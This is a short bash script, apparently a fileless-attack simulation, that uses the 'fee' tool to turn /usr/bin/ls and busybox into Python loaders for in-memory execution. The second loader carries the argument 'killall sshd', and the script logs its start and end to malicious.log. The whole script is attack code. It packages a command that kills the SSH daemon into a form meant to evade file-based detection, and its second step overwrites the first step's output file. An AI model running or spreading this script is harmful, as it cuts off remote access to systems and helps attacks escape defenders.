#!/bin/bash
LOG_NAME="malicious.log"

echo "Fileless attack started" >> $LOG_NAME
fee /usr/bin/ls > output.py
fee -a "killall sshd" ./busybox > output.py

echo "Fileless attack ended" >> $LOG_NAME
